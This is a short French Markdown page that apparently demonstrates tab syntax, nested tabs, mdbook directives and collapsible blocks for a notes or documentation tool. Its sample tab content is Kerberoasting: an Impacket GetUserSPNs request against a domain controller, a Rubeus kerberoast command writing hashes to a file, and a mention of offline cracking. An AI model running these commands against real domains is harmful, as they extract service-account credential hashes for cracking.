---
type: reference
tags: [focus/demo, onglets]
---

# Onglets

Les deux formes d'onglets, des onglets imbriqués et les directives mdbook.

````tabs
tab: Linux

Depuis une machine Linux, avec Impacket :

```bash
GetUserSPNs.py -request -dc-ip $DC_IP $DOMAIN/$USER
```

> [!TIP]
> Les tickets se cassent hors ligne, voir [[Kerberoasting]].

tab: Windows

```powershell
Rubeus.exe kerberoast /outfile:hashes.txt
```

```tabs
tab: Rubeus
Sortie au format hashcat.
tab: PowerView
`Invoke-Kerberoast` donne le même résultat.
```

tab: Notes

## Titre dans un onglet caché

- [ ] Vérifier la politique de mots de passe #onglets/a-faire
- Lien vers [[Accueil|l'accueil]]
````

{{#tabs }}
{{#tab name="Rust" }}
```rust
let total: u8 = 255u8.wrapping_add(1);
```
{{#endtab }}
{{#tab name="C" }}
```c
unsigned char total = 255 + 1;
```
{{#endtab }}
{{#endtabs }}

Voir aussi :

{{#ref}}
../Red Team/Kerberoasting.md
{{#endref}}

{{#include Langues.md}}

{{#title Une directive inconnue}}

<details open>
<summary>Détails repliables</summary>

Premier paragraphe du bloc repliable.

Second paragraphe, ouvert seul en mode Live.

</details>
